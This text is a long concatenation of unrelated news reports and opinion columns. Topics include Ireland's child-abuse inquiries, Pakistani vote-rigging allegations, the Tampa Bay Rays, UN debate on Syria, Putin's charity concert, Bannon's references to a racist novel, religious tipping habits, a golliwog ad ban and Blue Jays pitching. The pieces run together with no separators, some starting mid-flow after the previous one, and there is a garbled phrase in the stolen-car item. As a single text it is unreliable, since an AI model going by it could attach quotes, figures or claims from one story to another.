Please turn on JavaScript. Media requires JavaScript to play. Inquiries into alleged child abuse by Catholic orders in the Irish Republic are due to publish their findings. The Commission to Inquire into Child Abuse, investigating claims of abuse in state schools and orphanages since the 1940s, reports on Wednesday. A second report, due later this summer, is expected to criticise the handling of sex abuse complaints involving more than 100 priests in Dublin from 1975-2004. The commission has heard testimony from the residents of the state institutions where Ireland's poorest children, as well as the infants of unmarried mothers, were sent. The way the church handled the scandals, as we now know, was not exemplary to put it mildly
Father Vincent Twomey It was established following the airing of a documentary for Irish television on industrial schools, produced by Mary Raftery. "There was widespread sexual abuse, particularly in the boys' institutions," she said. "Extremely vicious and sadistic physical abuse, way off the scale, and horrific emotional abuse, designed to break the children. "We had people talk to us about hearing screams... the screams of children in the night coming from these buildings and really not knowing what to do. "They didn't know to whom they could complain because the power in the town was the religious order running the institution." Mary Raftery has written a book about the alleged child abuse All the institutions have since closed down, but the commission will make recommendations to prevent the future abuse of children in state care. The second report has been investigating cases involving more than 100 priests in Ireland's Archdiocese of Dublin. The Archbishop of Dublin Diarmuid Martin, who is seen as a reformer, used his homily on Holy Thursday to warn the gathering of Ireland's senior clergymen that the report would "shock us all". He said: "It is likely that thousands of children or young people across Ireland were abused by priests in the period under investigation and the horror of that abuse was not recognised for what it is." Andrew Madden, who was the first victim of a paedophile priest to come forward, said he was angry the state inquiry had taken so long. 'Too much power' He said: "It is 14 years since I first went public about this practice the Catholic Church had of moving priests with a record of child abuse on to another parish which would give them further access to children. "Only now is the state ready to publish a report into that practice... and then look at what it needs to do to change it." Ireland is a very different country now to the one shocked to the core by the first revelations involving child abuse by the clergy, some 15 years ago. The Church was slow to face up to cases of abuse, says Father Twomey It was traditionally one of the most Catholic countries in the world, but when the scandals began to emerge, congregations diminished and new vocations to religious orders fell dramatically. The Church was heavily criticised for failing to deal with priests who abused. "The way the Church handled the scandals, as we now know, was not exemplary to put it mildly," said Father Vincent Twomey, Professor Emeritus of Moral Theology at the National University of Ireland. "But the Church has learned, or was pushed to learning, that it had to do something and the result has been very positive," he said. "It has come up with a series of guidelines for the protection of children and they will go a long way to ensure that what has gone on in the past will never be repeated." But Colm O'Gorman, who was abused by one of Ireland's most notorious paedophiles Fr Sean Fortune, believes the Church still has too much power, particularly in education. "Well over 90% of all Irish primary schools are administered by the Catholic Church in Ireland," he said. "The local bishop is responsible for child protection within those schools. "That means we still have a situation where an institution that was so entirely negligent in how it addressed child protection concerns in the past, has full legal responsibility for child protection in the majority of Irish schools. "That's obviously a concern, and the state needs to do more in Ireland to take on that responsibility." When these two reports are released, this country - already rocked by a decade and a half of scandals - will be forced to reflect on a very dark period in its recent history. The Catholic Church will once again face serious questions about its role in the abuse of Irish children in the past and perhaps its place in Irish society today.

LAHORE: The Pakistan Tehreek-i-Insaf (PTI) has decided to expeditiously complete its investigations into alleged irregularities committed in the voter lists of NA-122 and PP-147 and approach the Election Commission of Pakistan, Nadra and courts “to expose the PML-N tactics.”
At a meeting chaired by PTI Punjab organiser Chaudhry Sarwar here on Sunday, Abdul Aleem Khan said the party was collecting “irrefutable evidence” and would not allow the PML-N to play a one-sided match. He said thousands of complaints of shifting of votes without consent had reached the PTI and similarly thousands of new votes were registered in this constituency. He said all the proofs would soon be presented before the media before approaching the ECP, Nadra and courts.
Aleem Khan said there was no doubt that the PML-N had won against him through rigging rather than the power of votes. He said the PTI would not sit silent, until it would expose the voter lists' fraud jointly planned by the PML-N, the ECP and Nadra. He said he was sure that the rulers would once again be exposed.
Mr Sarwar said he had decided to raise the PTI's voice against the ruling party's new technique of rigging and could even approach the European Union and United Nations. He said the PTI had immediately after the Oct 11 by-election written a letter to the ECP demanding the certified copies of voter lists meant for the 2013 general elections and 2015 Lahore by-election but the commission had yet to respond.
“The PTI would even go to the extent of lodging a complaint for the registration of an FIR against the ECP,” he added.
MPA Mian Aslam Iqbal claimed that in just one union council 216 of NA-122, as many as 154 votes were shifted and 174 votes registered. He also alleged that the returning officer had not provided complete voter lists to the candidates.
MPA Shoaib Siddiqui said that in PP-147 alone, some 8,000 to 10,000 PTI votes were removed and evidence in this regard had been collected.
Meanwhile, addressing a public gathering as part of local government election campaign, the PTI Punjab organiser said the ECP had become a “B Team” of the PML-N for the upcoming polls. He said the commission was providing incomplete voter lists to the PTI candidates. He warned the ECP against conniving with the PML-N and asserted that any move to rig the local government elections would result in the “political death” of the ruling party.
“Chief Election Commissioner retired Justice Sardar Raza Khan should take notice,” he demanded.

Groundswell building in Major League Baseball to dump the Tampa Bay Rays. From what I am hearing, I doubt there will be any baseball at Tropicana Field after 2014 even though the team's lease runs to 2027.
The harsh reality is the Rays still have no fan support despite winning the AL East two out of the past three seasons and making it to the 2008 World Series. Stuart Sternberg's group has done a good job of turning the team around on the diamond and developing and trading for young players since taking control in 2004. But the Rays have averaged only 23,000 at the gate the past three seasons even though prices have been slashed and in 2010 the team had the second-lowest ticket prices in the AL ($19.75).
It is getting impossible for the Rays to ink great talent. David Price and Evan Longoria dissed their fans for not supporting the team last year and Carl Crawford bolted for the Red Sox this winter. High-revenue team owners tell me the Rays are a dead brand commercially that needs to be pulled from life support. I could not agree more.

UNITED NATIONS (Reuters) - Reacting to new bloodshed in Syria, European powers relaunched a dormant draft U.N. resolution to condemn Damascus for its crackdown on protesters, circulating a revised text to the Security Council at a meeting on Monday.
Following the hour-long closed-door meeting, several diplomats said that after months of deadlock over Syria in the council, the fresh violence appeared to be pushing the divided members toward some form of reaction.
But envoys disagreed over whether the 15-nation body should adopt the Western-backed draft resolution or negotiate a less binding statement.
Germany requested the meeting after human rights groups said Syrian troops killed 80 people on Sunday when they stormed the city of Hama to crush protests amid a five-month-old uprising against President Bashar al-Assad.
The military offensive continued in Hama on Monday, residents said.
Practical council action on Syria, where rights group say over 1,600 people have been killed since the uprising began, has until now been paralyzed by disagreements among members.
Western European countries first circulated a draft resolution two months ago but it went nowhere after Russia and China, both allies of Damascus, threatened to veto it. Temporary council members Brazil, India, Lebanon and South Africa also said they did not support it.
Critics have said they fear that even a simple condemnation could be the first step toward Western military intervention in Syria, as happened in Libya in March. U.S. Ambassador Susan Rice described that as a “canard” and said the resolution contemplated no such thing.
Following a briefing on Syria by Oscar Fernandez Taranco, deputy head of the U.N. political department, all 15 council members spoke but the body took no immediate action, postponing discussion until Tuesday, diplomats said.
MOOD CHANGING
“I detected a certain convergence of thinking, concern about the escalating violence,” Indian Ambassador Hardeep Singh Puri, this month's council president, told reporters. “The members of the council all felt that the council should address itself to the situation and pronounce itself if the need be.”
Russian Ambassador Vitaly Churkin said: “I see some good ground for reaching agreement among council members to a good positive reaction from the Security Council.” He suggested this could happen “even tomorrow.”
But Churkin said he thought issuing a resolution was “somewhat excessive” and that a formal statement by the council president, calling for an end to violence but urging a peaceful political solution, would be “satisfactory.”
Most diplomats have argued from the outset that a presidential statement, which unlike a resolution requires unanimity, could never be agreed by Lebanon, which is under strong Syrian influence. But Churkin said a statement could be drafted that Lebanon could accept.
One Western diplomat said the Europeans still believed a resolution was necessary, but another said the format could be decided later. Rice said she favored a resolution but “we wouldn't preclude anything at this point.”
Earlier, Britain's U.N. Ambassador Mark Lyall Grant said the mood could be changing following the latest bloodshed in Hama. “I think there are some indications that positions are shifting,” he said, noting that Russia had issued a statement deploring the latest violence.
South African Ambassador Baso Sangqu described the latest events in Syria as “terrible” but said he could not spell out his country's position until he had studied the new draft.
Diplomats said the revised resolution was similar to its predecessor, updated to take in more recent events, and did not call for sanctions against Syria or a referral of Syrian leaders to the International Criminal Court. Those measures were demanded by rights group Amnesty International.
RUSSIA hasn't lacked for immodest public performances on the part of its prime minister, Vladimir Putin. In his drive to portray himself as Russia's national leader since stepping down as president more than two years ago, he has been photographed riding horseback bare-chested, fitting a satellite transmitter to a (sedated) tiger and riding in military planes.

But the spectacle of his singing in English was among the most wince-inducing. His wooden, heavily accented rendition of "Blueberry Hill" at a gala concert in December was like a scene from a comedy: uncharacteristically nervous ex-KGB officer tries, and fails, to project a softer side.
Surprisingly, Mr Putin's wasn't the most appalling display that evening. That was provided by the many Hollywood celebrities in attendance. Kevin Costner, Gerard Depardieu and Goldie Hawn, among others, laughed, clapped and sang along in support of the authoritarian ruler. Sharon Stone flashed a victory sign amid the hearty applause.
The concert was billed as a charity event to raise money for ill children. But it has ended up reinforcing Russia's image as one of the world's premier kleptocracies. Last week, after the mother of an ailing child made enquiries, it emerged that the funds raised during the concert never reached the hospitals to which it had been promised.
"A very strange situation has arisen," the mother wrote in an open letter. "Before and after the concert there was talk about handing over funds, and now it appears that no one had promised anything."
Mr Putin's spokesman, Dmitry Peskov, said the prime minister was only a guest at the concert, and was not involved in the fundraising. He declined to say who was responsible for handling the proceeds, but assured that the government is satisfied the "work is being carried out." He later provided a list of three hospitals in Moscow and St Petersburg he said would receive medical equipment bought with proceeds from the concert.
But it is unclear who has the money and how it will reach the hospitals. A spokeswoman for the Federation Foundation, the charity that organised the event, said it was only involved in planning the concert and had nothing to do with the donated funds. At the same time, a former musician named Vladimir Kiselyov, believed to have responsible for spearheading the event, warned reporters to mind their business and "not to look for anyone."
"No one will tell you anything," he said.
Stephen Bannon, President Donald Trump's chief strategist and the driving force behind the administration's controversial ban on travelers from seven Muslim-majority countries, has a favorite metaphor he uses to describe the largest refugee crisis in human history.
“It's been almost a Camp of the Saints-type invasion into Central and then Western and Northern Europe,” he said in October 2015.
“The whole thing in Europe is all about immigration,” he said in January 2016. “It's a global issue today — this kind of global Camp of the Saints.”
“It's not a migration,” he said later that January. “It's really an invasion. I call it the Camp of the Saints.”
“When we first started talking about this a year ago,” he said in April 2016, “we called it the Camp of the Saints. ... I mean, this is Camp of the Saints, isn't it?”
Bannon has agitated for a host of anti-immigrant measures. In his previous role as executive chairman of the right-wing news site Breitbart — which he called a “platform for the alt-right,” the online movement of white nationalists — he made anti-immigrant and anti-Muslim news a focus.
But the top Trump aide's repeated references to The Camp of the Saints, an obscure 1973 novel by French author Jean Raspail, reveal even more about how he understands the world. The book is a cult favorite on the far right, yet it's never found a wider audience. There's a good reason for that: It's breathtakingly racist.
“[This book is] racist in the literal sense of the term. It uses race as the main characterization of characters,” said Cécile Alduy, professor of French at Stanford University and an expert on the contemporary French far right. “It describes the takeover of Europe by waves of immigrants that wash ashore like the plague.”
The book, she said, “reframes everything as the fight to death between races.”
Upon the novel's release in the United States in 1975, the influential book review magazine Kirkus Reviews pulled no punches: “The publishers are presenting The Camp of the Saints as a major event, and it probably is, in much the same sense that Mein Kampf was a major event.”
Linda Chavez, a Republican commentator who has worked for GOP presidents from Ronald Reagan to George W. Bush but opposed Trump's election, also reviewed the book back then. Forty years later, she hasn't forgotten it.
“It is really shockingly racist,” Chavez told The Huffington Post, “and to have the counselor to the president see this as one of his touchstones, I think, says volumes about his attitude.”
I have a few conflict-of-interest disclosures to get off my chest before wading into this mess:
My daughter Larissa spent many years and countless long, hard hours of her young life waiting tables while attending university. I am a generous tipper for good service. See #1 for the reason why. When I worked in P.R. for an international Christian aid organization years ago, I used to cringe in embarrassment on the very rare occasions when our office went out for lunch together. Typically, I'd be one of the very few in our party who left a tip. Many of my über-devout colleagues never tipped our servers. Ever. One even openly blamed his modest wages as his excuse for stiffing the waitstaff, to which I would immediately respond with something charitable like: “Then you should be eating under the Golden Arches, you frickety-frackin' cheapskate!”
Claire Gordon, writing in Daily Finance, has recently reported on a distressing dining-out trend in some Christian circles that brings me back to those embarrassing moments.
She writes about a young male waiter who went to retrieve a $10 bill peeking out from under a diner's plate recently, when he reportedly noticed something curious about this generous tip. The tip wasn't monetary, but took the form of advice printed on a fake $10 bill:
“SOME THINGS ARE BETTER THAN MONEY like your eternal salvation, that was bought and paid for by Jesus going to the cross.”
The waiter, who makes $2.65 base pay an hour, didn't take well to getting so self-righteously stiffed. (The verb “to stiff”, by the way, means: “To cheat someone of something owed; to fail to give or supply something expected or promised.” Urban Dictionary)
While this fake $10 tip nonsense certainly isn't the rule among Christians, writes Gordon, it may not be an exception. These phony bills appeared at least as far back as the summer of 2006 during the Southern Baptist Convention Annual Meeting in Greensboro, North Carolina, when they began to show up around town under the empty plates of retreating restaurant diners attending the convention that year.
The rumour that Christians are poor tippers has apparently been whispered in restaurant circles for a long time. Even Justin Wise, the director of a Lutheran ministry in Des Moines, Iowa, wrote in The Lutheran magazine in January 2009 that many waiters try not to work Sunday brunch so as to avoid notoriously stingy churchgoers.
“Christians don't tip very well. As a matter of fact, we're pretty cheap. What makes this worse is that we paint ‘cheap' with a religious-sounding veneer and call it ‘being a good steward.' Nothing like hiding behind the Bible to camouflage your stinginess.”
Claire Gordon explains that this is a particularly uncomfortable phenomenon to face for a religious community that values generosity, justice and service. Daniel Readle, a pastor at a Baptist church in Cleveland, on his blog Christ and Culture, wrote:
“By leaving tracts and not tips, that person is saying to their waiter or waitress, ‘You are not a person, but rather just a notch on my belt of evangelistic pride'.”
I understand that there are a considerable number of restaurant patrons who oppose the idea of compulsory tipping, particularly feeling pressured to tip a proscribed percentage (15-20%) whether your service has been stellar or merely mediocre. We can generalize that there are indeed in our society the generous tippers, the under-tippers, and then there are the nothing-at-all-tippers.
Let me just say that if you are planning to leave no tip at all for cause (let's say, for example, you've witnessed your server spitting in the soup), then the only decent thing to do is to go directly to the restaurant owner with your complaint before you leave the building. You do not stiff your server because you don't like your food – that's the pervue of the kitchen chef alone, not the poor waitstaff. If you don't like your food, you politely ask your server to return it to the kitchen, or to adjust your bill, or speak directly to the restaurant owner. You don't punish your server.
Here in Canada, a BMO Bank of Montreal Mosaik MasterCard study of over 1,500 English- and French-speaking Canadian adults has found that 78% of us regularly leave a 15% average gratuity after dining out.
Other countries can vary: in fine hotel dining rooms of Brazil, Costa Rica or China, for example, no tip is required because a 10% gratuity is routinely included in the bill. And in most Russian restaurants, you're warned to tip 10% in cash directly to the waiter (if you just leave it on the table, management might pocket it).
But whether you oppose the practice of tipping on principle or not, you have to wonder at the motivation of the dim bulbs who came up with the very un-Christian-like idea of printing phony $10 bill “tips” to distribute to unsuspecting restaurant servers.
Did they think at the time that this idea was oh-so-clever? Noble? Amusing? Do they congratulate each other with silent smirks whenever they slide a fake $10 bill under their empty plates and scurry quickly out of the restaurant like the hypocritical slime-cowards they are?
A study on this trend was conducted recently by Dr. Michael Lynn of Cornell University. He actually found that Christians are not in fact bad tippers; they gave an average of 17.3% for good service, well within the 15% to 20% norm.
Only 13% of Christians left no tip even for good service. That's a small minority of Christians, but still almost double the percentage of unaffiliated non-religious diners who left nothing, and more than six times the percentage of Jewish diners who chose to stiff their waitstaff.
So while it is statistically false to say that Christians are bad tippers, it is true that Christians are far more likely to stiff their servers than people of other religious (or non-religious) persuasions. This is unfortunate, because this reality taints the reputation of all Christian restaurant-goers.
Because of these penny-pinchers, Dr. Lynn adds that waiters are indeed more likely to give bad service to anyone who appears outwardly Christian, or to call in sick for their Sunday shifts.
Some researchers, however, describe the “Sunday effect”, in which Christians tend to act more charitably on Sundays. For example, an interesting study published in the journal Judgment and Decision Making actually suggests that religious people are more likely than non-religious people to respond to an appeal “for charity” only on days when they visit their place of worship; on other days of the week, religiosity has no effect on their desire to be generous. (“When are religious people nicer? Religious salience and the “Sunday Effect” on pro-social behavior”. Judgment and Decision Making, Vol. 5, No. 2, April 2010, pp. 138–143)
Maybe this Christian generosity on Sundays hasn't hit those who think sliding a fake $10 bill under their empty restaurant plate is a decent way to treat others.
COLUMBIA, S.C. (AP) — A coroner says a 16-year-old South Carolina high school student who collapsed and died in a classroom had heart problems caused by drinking too much caffeine.
Richland County Coroner Gary Watts said at a news conference Monday that Davis Cripe drank a large Mountain Dew, a latte from McDonald's and an energy drink in the two hours before his heart fell out of rhythm at Spring Hill High School near Chapin on April 26.
Watts says parents need to know that while a soda or a cup of coffee is OK, large amounts of caffeine can be deadly.
Cripe's father says he was a good son who would never touch alcohol or drugs and he hopes the teen's death will save other lives by showing the dangers of excessive caffeine.
Daytona Beach, FL - Three 16-year-old boys have been arrested in Daytona Beach after police say they were involved in a crash with Daytona Beach's chief of police while driving a stolen vehicle.Chief Mike Chitwood said a woman left her car running at Mason Avenue and Berkshire Road when three teens jumped in and took off.Within minutes, police said they spotted the car and tried getting it to pull over.Despite blowing two of It's tired while fleeing from police, the teens kept going. When Chitwood tried stopping them himself at Berkshire and Dunn, the car turned into his cruiser and sideswiped it before driving away and crashing, police said. "They could have easily killed themselves or somebody else," Chitwood said. "And nobody was hurt.At the end of the day, there is little damage to a police car and that's the end of it. We were lucky and they were lucky."Chitwood said all three were arrested. Police say the driver was arrested in January on accusations of stealing a car.
Like many IWW members in the UK I work in the public sector. Traditionally this has been an area of high trade union density particularly in teaching, the civil service and health. It is also one of the last bastions of collective bargaining power for the trade union movement. Although as the recent record of capitulation to austerity policies, cuts in pay and cuts in social services shows trade union density rarely equals trade union militancy.
“Dual carding” – membership in a craft union alongside the IWW – is a relatively underdeveloped strategy for the UK. In spite of a reputation for “minority unionism” Wobblies have historically played animating roles in trade unions aside their commitment to building a combative and revolutionary alternative to craft union structures. The IWW, after all, was the product of an amalgamation of the most militant and advanced expressions of the trade union movement of the time.
In spite of this it would also be simplistic to say that membership in the IWW and activity in a broader trade union is fully harmonious. The IWW does ultimately exist as a criticism of the limitations of craft unionism and its reformist methods. Many leftists labour under the illusion that trade unions can be captured and turned towards revolutionary aims. In practice this has often meant running left leadership slates for union elections. A practice that is neither appealing to Wobblies nor has proved particularly successful in terms of shifting the actual activity of trade unions. An equally common approach is to stoke rank-and-file militancy at the branch level, either through the building of left caucuses or networks of militant reps. This seems like a more natural approach for a Wobbly to take promoting those qualities and methods that we see as valuable in syndicalist organising – militancy, activism from the roots, bottom-up over top-down etc.
Yet this approach also has its limitations. The structure and organisation of the trade unions can undercut struggles even at the rank-and-file level. Just like any experienced organiser should prepare strategies for dealing with a difficult and divisive boss, a dual-carder needs to anticipate and prepare for the possibility that trade union bureaucracies will undermine the work of militant organisers and remove them from a position of influence with the membership if they see them as troublesome or a threat. Our aims should also go beyond simply organising more militant and combative trade unions. We need to understand how our activities as trade unionists help to sow the seeds of workers' control in our industries in addition to building links with those in unorganised sectors and supporting our fellow workers growing IWW campaigns.
I recently had the opportunity to act as a representative for my local NUT (National Union of Teachers) branch, below are a number of observations developed from experimenting with this new role. My aim is that these offer a contribution to some of the issues that are raised above as part of a broader debate on dual-carding in the union:
1. Debunking the myth of the “militant union rep” – building a militant membership
It is a widespread view within trade union branches that it's reps who should do most of the leg-work. This perception is reinforced by the fact that the majority of union resources, communication and, most importantly, meetings with management happen exclusively through the rep. The result is that workmates will talk more or less favourably about “bolshie reps” who are capable/incapable of standing up to management on their behalf. This is a bottle-neck in collective strength that a boss can easily exploit to demobilise, distract or diffuse the activity of the union. Good reps need to send the message out that it's the membership that calls the shots and not them. A step towards building a new union culture on this basis is bringing workmates into these otherwise exclusive communication channels. Dual-carders should share rep guides and union resources, carefully minute meetings with management, show how issues raised have been actioned and insist that problems are raised collectively through regular branch meetings and not via private communication with the rep. Even in recognised workplaces workers need to be educated on the idea that the union is only as strong as its membership and a poorly organised union can easily fall into a forum of consultation with management or even be de-recognised.
2. The branch is not a social space – so make one.
Trade union branches are generally very poorly organised. This does create opportunities for dual-carders in terms of introducing more democratic and inclusive processes without much institutional resistance. But in the absence of such clear structures meetings can often just be collective moaning sessions that can be tiring and demobilising for those involved. It is, of course, important for people to blow off steam especially in stressful professions but this shouldn't come at the expense of collective action. So why not create alternative spaces to do that? In the North we have been experimenting with this kind of model for young professionals in teaching. Our “Educators Underground” group meets once a month with young education professionals across the city. We talk about stresses and emotional challenges we have had at work, discuss alternative educational theories and provide advice and support to each other going back to our union branches. This helps to fill gap in the current trade union structure as well as making us feel like we are well supported by our fellow workers in the same sector.
3. Act collaboratively, reproduce yourself.
Any good organiser should aim to reproduce themselves and this is as true of a dual-carder as it is an organiser within an IWW campaign. By sheer coincidence when I stood for position of branch union rep another workmate also expressed interest in the role. Rather than run a competitive election I suggested that we could share the job. This turned out to be a beneficial move for both of us. I was grateful for the help and support my co-rep could offer in getting to grips with the new role. Having another perspective on the running of the branch was also really valuable. I was able to support them in areas where they were less experienced such as meeting with the boss for the first time. And together we were able to bring in more robust changes to how branch meetings were run by virtue of the extra pair of hands and added energy. We also had the bonus benefit of strength of numbers in our last meeting with management (myself, my co-rep and the outgoing rep outnumbering the head 3-1)! I'm now convinced that this practice should be pushed in all areas where it is practical. It shares out valuable skills, makes sure that there are others to step up when you are unable to fully take on union responsibilities and further debunks the myth that the rep is the linchpin of the branch.
4. Act like OBU, even if you aren't one.
Most public sector workplaces will have multiple recognition deals with different sections of the workforce. Legal action across these divides is difficult (that's not to say that other forms of solidarity aren't both practical and desirable) but there is nothing stopping you acting as a single unit in terms of how you organise within that work site. Inviting reps from other trade unions on site to your branch meetings is a good first step towards building dialogue between different sections of the workforce. Individuals or groups from unorganised sections can likewise be sought out and invited, for example, agency or temporary staff. Ideally at a more advanced stage this could evolve into a forum for discussion and decision-making across the work site and present a natural springboard for cross-site solidarity and industrial action.
Within this it is similarly important to maintain a parallel structure of social contacts and connections with workmates that exist outside the official trade union role. If you get into a position where you need to call unofficial or unsanctioned industrial action the trade union will do everything in its power to halt it. It's important in this case to have a working knowledge of the social map of your workplace to ensure success irrespective of the existence of the trade union labels. If you have approached the role with the idea of organising the worker as well as the branch you should be able to call on the former when the latter comes under attack. In effect falling back on the strength of the red card when the blue/green/grey/yellow/white one has failed you.

Inclusion of the words ‘English freedom' underneath controversial character was likely to contribute to offence caused by advert, says ASA
A newspaper ad for an Enid Blyton gift shop featuring a golliwog has been banned after the advertising watchdog found it was likely to cause serious offence.
Corfe Castle's Ginger Pop shop – which describes itself on its website as “all about Enid Blyton and her era” – ran an advert in local Dorset paper the Purbeck Gazette. It featured an illustration of a golliwog holding a pint of ginger beer with text underneath reading “English freedom”. Underneath this it read “Visit our shop and get the tea towel”.
Two readers, who believed the depiction of the golliwog character was racist, complained to the Advertising Standards Authority that the ad was offensive.

The shop's owners said they did not accept that the golliwog represented negative racial stereotypes, claiming it had a long history with origins in a children's book in the late 19th century. They believed the character in the original books and on Robertson's marmalade badges was heroic and was an aspirational role model, but acknowledged it had become stereotyped over time.
They also provided a letter from a supporter and a comments book from their shop, which they said showed most passers-by were positive about the fact they sold golliwogs.
Ginger Pop had produced a tea towel intended to celebrate 120 years of golliwogs, which it said included words far removed from the minstrel doll stereotype.
The Purbeck Gazette said it had checked the legality of the ad prior to running it and had been told it was within the law. It had not directly received any complaints.
The ASA said it understood that there had been some local controversy around the tea towel, and that the ad was a reference to that. However, it did not consider that all readers would be aware of that background.
It said “many people were likely to view the character as representing negative racial stereotypes” and its inclusion in a press ad was “likely to cause serious or widespread offence”.
Including the words “English freedom” was likely to make this worse because “in combination with the image it could be read as a negative reference to immigration or race”.
The ASA therefore banned the ad.
MLB's incoming commissioner, Rob Manfred, says in a new video on ESPN that he's interested in eliminating defensive shifting:
I think the second set of changes I would look at is related, and that relates to injecting additional offense in the game. For example, things like eliminating shifts -- I would be open to those sorts of ideas. ... We have really smart people working in the game, and they're going to figure out ways to get a competitive advantage. I think it's incumbent upon us in the commissioner's office to look at the advantages that are produced, and say, "Is this what we want to happen in the game?"
No. Just no. The guy is just starting on the job, and already he makes me want Bud Selig back. Shifts are a key reason the Pirates have been able to compete over the past couple of years, and a key reason why the gap between the haves and the have-nots in baseball has shrunk. But hey, they'll just create some asinine, arbitrary system where fielders can only stand in prescribed areas. Maybe they'll just draw an X on the infield between second and third so the shortstop knows where he's allowed to stand. Then perhaps Commissioner Manfred can eliminate the rule that allows teams to control player salaries for the first six years, and just make everyone a free agent off the bat. Anything to prevent big-market teams from having to get creative to win.
I don't think the lack of offense in baseball is a problem, but maybe there are ways to increase the amount of offense in the game, and we just don't know what they are yet. Let baseball's brightest minds figure it out, rather than punishing them for being smart.
A statement on the site of one of the major Dutch banks ABN AMRO said that a prototype crypto wallet had been developed by its innovation centre. The news triggered a discussion but soon was deleted.
Update: As it has been clarified by the bank, the web page in question is outdated and refers to a long-time abandoned project. The reason why it suddenly went online is yet unknown. Thank you, G1lius ;)
According to the announcement, the wallet was allegedly ready for the launch, but the bank was examining the demand for the new service in the country before taking a final decision. At the end of the announcement, readers were asked to send their feedback if they supported the idea to have an ABN AMRO bitcoin wallet. However, the button "I am interested" led to a blank page.
In the related discussion on Reddit the user Introshine early noted that the news was likely a fake because it had not been indexed by search engines or published on the website's news page.
“And I've called branch office, they don't even know what Bitcoin is. Prob. fake. Most likely a joke by an intern or something,” he wrote. “Just left that bank and the floor manager laughed me right in the face when I mentioned Bitcoin,” reported another forum member PixelPhobiac.
Later the bank deleted the questionable web page and openly disproved the statement on Twitter, promising to sort out the issue “internally”.
@patjanter Het is nog even een raadsel hoe dit bericht naar voren is gekomen. Dit wordt verder intern uitgezocht. Mijn excuus ^Jeremy — ABN AMRO (@ABNAMRO) September 8, 2016
It is noteworthy that many bitcoin enthusiasts were ready to consider the event of a BTC wallet being launched by ABN AMRO as probable. Overall, expectations of the approaching mainstream adoption of bitcoin are high in the community, especially after the recent news of a bitcoin ATM installed by Deloitte in their Toronto head office.
Holland is considered a “bitconers' paradise”. The country boasts the highest concentration of companies providing goods and services for bitcoins. The Netherlands regularly host bitcoin-related events and feature a number of bitcoin ATMs. However, cryptocurrencies are not regulated by the country's financial legislation, which makes a sudden bitcoin integration by one of the country's largest banks dubious.

Until Dawn is set to release on August 25, 2015, exclusively for PlayStation 4. It seems better fitted for an October release, but obviously Sony is thinking… I don't know what the heck their thinking…
Over the weekend, a number of new previews for the upcoming Playstation 4-exclusive survival horror Until Dawn were published. And with those came a fresh batch of chilling new screenshots.
The screenshots show off the creepy nature of the game which sees eight friends trapped together on a remote mountain retreat with a psychopathic murderer stalking them. The screenshots give us a look at the eight characters you'll play as — with your actions deciding who survives — but there are two images in particular that stand out for their creepiness factor. You'll know which ones when you see them.
Scott MacArthur TSN 1050 Blue Jays Reporter Follow|Archive
NEW YORK – There are plenty of opinions about what the Blue Jays should do with their starting rotation over the next three weeks. With four off days, the first of which is scheduled for Monday prior to a six-game homestand, manager John Gibbons and pitching coach Pete Walker can get creative.
“We have a pretty good idea about what we're going to do,” Walker told TSN.ca. “Nothing's in stone. There can always be some adjustments based on how guys perform and how they feel. We do have some guys we're keeping an eye on; some of our veteran guys who we want to make sure are feeling good.”
The immediate plan is to keep the rotation on schedule, giving each starter an extra day of rest. Drew Hutchison will pitch Tuesday's opener at home against Oakland, followed by Mark Buehrle on Wednesday and R.A. Dickey on Thursday. The Yankees arrive in Toronto on Friday, which sets up David Price to be followed by Marco Estrada on Saturday.
Then it gets interesting.
Sunday's finale against New York would be Hutchison's to pitch. However, it's been a trying season for the soon-to-be 25-year-old; he's posted an ERA of 5.42 and his peripheral statistics like FIP, which attempts to calculate ERA based on factors only a pitcher can control, are unfairly kind. The truth is Hutchison isn't getting deep enough into games - mostly because he's been repeatedly hit hard through the third turn of the lineup - and Gibbons, as a result, has been quick with the hook.
Any thought to switching Buehrle to Tuesday, on regular rest, and Hutchison to Wednesday on two extra days was dispelled when Buehrle, not feeling at his best, was forced to grind through seven solid innings in Thursday's win over Minnesota.
“We certainly don't want to abuse anybody and throw them when maybe they're not ready,” said Walker. “We have a pretty firm idea what we're going to do, but we can make some adjustments with the scheduling.”
Price will pitch as often as possible on regular rest, which makes sense. He's the staff ace, brought in for the final two months to pitch the Jays into the playoffs for the first time in 22 years. Think CC Sabathia on the 2008 Brewers, but with fewer starts on short rest.
Speaking of short rest, Dickey already has one start under his belt and there could be more.
“That's a possibility; I've already approached him about that as a possibility, especially as we get closer to the end,” said Walker. “He's certainly willing and capable but, again, he's not 25 and we want to make sure he feels good and it doesn't affect him for his outings after that.”
If Hutchison struggles on Tuesday, maybe Buehrle is pushed from Wednesday to Thursday and Dickey goes on regular rest on Wednesday. That would open up the possibility to bring Dickey back, on short rest, against the Yankees on Sunday. He's excelled against New York.
Don't sleep on Liam Hendriks, either. He could make a spot start - with a strict pitch count - at some point.
Got the sense there are numerous possibilities?
What is clear, as it relates to Hutchison, is that Tuesday's start affects whether he pitches on Sunday and, if he gets his Sunday start, how he performs will determine whether he remains in the rotation for the Philadelphia, Anaheim, Texas road trip which begins on August 18.
“We want to get him in a little bit of a groove,” said Walker. “He's getting the ball Tuesday night and we're looking forward to a good start. He had a good side session. He's certainly put up some good numbers at home.
“We'll make the adjustments as we go,” Walker continued. “Right now our plan is to keep him in the rotation and keep him every fifth day or as close to it as possible. He's certainly capable of giving us a quality start and winning a ballgame.”
The Blue Jays also have three off days in September, which will create plenty more opportunities to reconfigure the rotation.
In it to win it, the club won't mess around with underperformers.
Dan Senor talks of a "systemic" crisis in right-wing polling that misled the Romney campaign.
"There is some kind of systemic crisis today in the world of polling, I think particularly on the right-of-center polling. The modeling was way off," Senor said during an appearance on MSNBC's Morning Joe." How pollsters on the Republican side, although not just on the Republican side, you saw Gallup make similar mistakes, you saw Rasmussen make similar mistakes. The understanding, the assumptions made about what the electorate looked like was way off."
With due respect to Dan, a smart & conscientious guy, the crisis is not in the world of right-of-center polling. It's in the world of right-of-center poll consumers. What Gallup and Rasmussen did was assume that minorities must be disenchanted with Obama. That's not polling science, it's punditry -and as we now see, it was bad punditry.
Gallup and Rasmussen built their assumption about minority attitudes into their modeling of the electorate, and thus predicted a better performance for Romney than almost anybody else.
The readiness of conservatives to accept the Gallup and Rasmussen numbers, and to reject pollsters who modeled the electorate on the assumption that the 1980-2008 trends would continue in 2012, was based on emotion, not analysis.
What happened to the pollsters was nothing more complicated than the old programmer rule: Garbage In, Garbage Out.
What happened at Romney HQ was a sadder phenomenon, familiar to every movie star and billionaire: if you pay people to lie to you, you'll hear a lot of lies.
